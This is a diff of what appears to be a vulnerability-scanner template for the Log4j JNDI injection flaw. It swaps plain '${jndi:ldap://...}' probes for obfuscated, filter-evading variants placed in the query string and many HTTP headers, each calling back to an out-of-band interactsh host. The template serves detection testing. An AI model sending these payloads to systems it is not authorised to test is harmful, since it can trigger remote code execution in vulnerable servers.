@@ -15,90 +15,90 @@ info:
 requests:
   - raw:
       - |
-        GET /?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        Accept: ${jndi:ldap://{{Host}}.accept.{{interactsh-url}}}
-        Accept-Encoding: ${jndi:ldap://{{Host}}.acceptencoding.{{interactsh-url}}}
-        Accept-Language: ${jndi:ldap://{{Host}}.acceptlanguage.{{interactsh-url}}}
+        Accept: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accept.{{interactsh-url}}/(}
+        Accept-Encoding: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.acceptencoding.{{interactsh-url}}/(}
+        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.acceptlanguage.{{interactsh-url}}/(}
 
       - |
-        GET /?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        X-CSRF-Token: ${jndi:ldap://{{Host}}.xcsrftoken.{{interactsh-url}}}
-        X-Druid-Comment: ${jndi:ldap://{{Host}}.xdruidcomment.{{interactsh-url}}}
-        X-Forwarded-For: ${jndi:ldap://{{Host}}.xforwardedfor.{{interactsh-url}}}
+        X-CSRF-Token: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xcsrftoken.{{interactsh-url}}/(}
+        X-Druid-Comment: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xdruidcomment.{{interactsh-url}}/(}
+        X-Forwarded-For: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xforwardedfor.{{interactsh-url}}/(}
 
       - |
-        GET /?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        Referer: ${jndi:ldap://{{Host}}.referer.{{interactsh-url}}}
-        Upgrade-Insecure-Requests: ${jndi:ldap://{{Host}}.upgradeinsecurerequests.{{interactsh-url}}}
-        User-Agent: ${jndi:ldap://{{Host}}.useragent.{{interactsh-url}}}
-        X-Api-Version: ${jndi:ldap://{{Host}}.xapiversion.{{interactsh-url}}}
+        Referer: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.referer.{{interactsh-url}}/(}
+        Upgrade-Insecure-Requests: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.upgradeinsecurerequests.{{interactsh-url}}/(}
+        User-Agent: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.useragent.{{interactsh-url}}/(}
+        X-Api-Version: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xapiversion.{{interactsh-url}}/(}
 
       - |
-        GET /?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        Authentication: Bearer ${jndi:ldap://{{Host}}.authenticationbearer.{{interactsh-url}}}
-        Cookie: ${jndi:ldap://{{Host}}.cookiename.{{interactsh-url}}}=${jndi:ldap://{{Host}}.cookievalue.{{interactsh-url}}}
-        Location: ${jndi:ldap://{{Host}}.location.{{interactsh-url}}}
-        Origin: ${jndi:ldap://{{Host}}.origin.{{interactsh-url}}}
+        Authentication: Bearer ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.authenticationbearer.{{interactsh-url}}/(}
+        Cookie: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.cookiename.{{interactsh-url}}/(}=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.cookievalue.{{interactsh-url}}/(}
+        Location: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.location.{{interactsh-url}}/(}
+        Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.origin.{{interactsh-url}}/(}
 
       - |
-        GET /?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        Access-Control-Request-Headers: ${jndi:ldap://{{Host}}.accesscontrolrequestheaders.{{interactsh-url}}}
-        Access-Control-Request-Method: ${jndi:ldap://{{Host}}.accesscontrolrequestmethod.{{interactsh-url}}}
-        Authentication: Basic ${jndi:ldap://{{Host}}.authenticationbasic.{{interactsh-url}}}
+        Access-Control-Request-Headers: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accesscontrolrequestheaders.{{interactsh-url}}/(}
+        Access-Control-Request-Method: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accesscontrolrequestmethod.{{interactsh-url}}/(}
+        Authentication: Basic ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.authenticationbasic.{{interactsh-url}}/(}
         
       - |
-        GET /?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        X-Origin: ${jndi:ldap://{{Host}}.xorigin.{{interactsh-url}}}
-        If-Modified-Since: ${jndi:ldap://{{Host}}.ifmodifieds.{{interactsh-url}}}
+        X-Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xorigin.{{interactsh-url}}/(}
+        If-Modified-Since: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.ifmodifieds.{{interactsh-url}}/(}
         
       - |
-        GET /xy4?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        Accept: ${jndi:ldap://{{Host}}.accept.{{interactsh-url}}}
-        Accept-Encoding: ${jndi:ldap://{{Host}}.acceptencoding.{{interactsh-url}}}
-        Accept-Language: ${jndi:ldap://{{Host}}.acceptlanguage.{{interactsh-url}}}
+        Accept: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accept.{{interactsh-url}}/(}
+        Accept-Encoding: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.acceptencoding.{{interactsh-url}}/(}
+        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.acceptlanguage.{{interactsh-url}}/(}
 
       - |
-        GET /xy4?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        X-CSRF-Token: ${jndi:ldap://{{Host}}.xcsrftoken.{{interactsh-url}}}
-        X-Druid-Comment: ${jndi:ldap://{{Host}}.xdruidcomment.{{interactsh-url}}}
-        X-Forwarded-For: ${jndi:ldap://{{Host}}.xforwardedfor.{{interactsh-url}}}
+        X-CSRF-Token: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xcsrftoken.{{interactsh-url}}/(}
+        X-Druid-Comment: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xdruidcomment.{{interactsh-url}}/(}
+        X-Forwarded-For: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xforwardedfor.{{interactsh-url}}/(}
 
       - |
-        GET /xy4?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        Referer: ${jndi:ldap://{{Host}}.referer.{{interactsh-url}}}
-        Upgrade-Insecure-Requests: ${jndi:ldap://{{Host}}.upgradeinsecurerequests.{{interactsh-url}}}
-        User-Agent: ${jndi:ldap://{{Host}}.useragent.{{interactsh-url}}}
-        X-Api-Version: ${jndi:ldap://{{Host}}.xapiversion.{{interactsh-url}}}
+        Referer: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.referer.{{interactsh-url}}/(}
+        Upgrade-Insecure-Requests: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.upgradeinsecurerequests.{{interactsh-url}}/(}
+        User-Agent: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.useragent.{{interactsh-url}}/(}
+        X-Api-Version: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xapiversion.{{interactsh-url}}/(}
 
       - |
-        GET /xy4?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        Authentication: Bearer ${jndi:ldap://{{Host}}.authenticationbearer.{{interactsh-url}}}
-        Cookie: ${jndi:ldap://{{Host}}.cookiename.{{interactsh-url}}}=${jndi:ldap://{{Host}}.cookievalue.{{interactsh-url}}}
-        Location: ${jndi:ldap://{{Host}}.location.{{interactsh-url}}}
-        Origin: ${jndi:ldap://{{Host}}.origin.{{interactsh-url}}}
+        Authentication: Bearer ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.authenticationbearer.{{interactsh-url}}/(}
+        Cookie: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.cookiename.{{interactsh-url}}/(}=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.cookievalue.{{interactsh-url}}/(}
+        Location: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.location.{{interactsh-url}}/(}
+        Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.origin.{{interactsh-url}}/(}
 
       - |
-        GET /xy4?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        Access-Control-Request-Headers: ${jndi:ldap://{{Host}}.accesscontrolrequestheaders.{{interactsh-url}}}
-        Access-Control-Request-Method: ${jndi:ldap://{{Host}}.accesscontrolrequestmethod.{{interactsh-url}}}
-        Authentication: Basic ${jndi:ldap://{{Host}}.authenticationbasic.{{interactsh-url}}}
+        Access-Control-Request-Headers: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accesscontrolrequestheaders.{{interactsh-url}}/(}
+        Access-Control-Request-Method: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accesscontrolrequestmethod.{{interactsh-url}}/(}
+        Authentication: Basic ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.authenticationbasic.{{interactsh-url}}/(}
         
       - |
-        GET /xy4?auth=1&res=js&x=${jndi:ldap://{{Host}}.{{interactsh-url}}} HTTP/1.1
+        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        X-Origin: ${jndi:ldap://{{Host}}.xorigin.{{interactsh-url}}}
-        If-Modified-Since: ${jndi:ldap://{{Host}}.ifmodifieds.{{interactsh-url}}}
+        X-Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xorigin.{{interactsh-url}}/(}
+        If-Modified-Since: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.ifmodifieds.{{interactsh-url}}/(}
         
 
     matchers-condition: and
